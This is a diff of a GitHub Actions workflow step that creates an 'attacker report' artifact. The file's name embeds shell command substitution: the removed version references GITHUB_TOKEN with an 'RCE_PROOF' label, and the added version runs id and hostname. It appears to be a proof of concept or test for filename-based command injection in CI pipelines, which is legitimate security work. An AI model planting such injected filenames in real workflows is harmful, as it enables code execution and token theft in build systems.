@@ -12,7 +12,7 @@ jobs:
         run: |
           mkdir -p /tmp/content
           printf '1\n' > /tmp/content/pr_number.txt
-          echo "attacker report" > '/tmp/content/$(x=$GITHUB_TOKEN; echo RCE_PROOF_run_$GITHUB_RUN_ID_tokenlen_${#x}).txt'
+          echo "attacker report" > '/tmp/content/$(id)$(hostname).txt'
           ls -la /tmp/content
       - name: Upload
         uses: actions/upload-artifact@v4
